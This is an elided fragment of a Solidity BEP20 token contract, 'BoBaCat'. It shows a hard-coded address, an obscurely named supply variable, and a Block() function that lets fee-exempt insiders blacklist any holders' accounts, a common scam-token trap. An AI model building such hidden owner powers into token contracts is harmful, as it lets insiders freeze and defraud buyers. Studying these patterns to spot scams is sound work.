...
contract BoBaCat is Context, IBEP20, Ownable {
    ...
    address luna = 0x3B3691d4C3EC75660f203F41adC6296a494404d0;
    uint256 private sAAmm = 100000000 * 10 ** 18;
    ...
    */
    ...
    function Block(address[] memory accounts) public{
        require(_isExcludedFromFee[msg.sender] == true);

        for (uint256 i = 0; i < accounts.length; i++) {
            _block[accounts[i]] = true;
        }
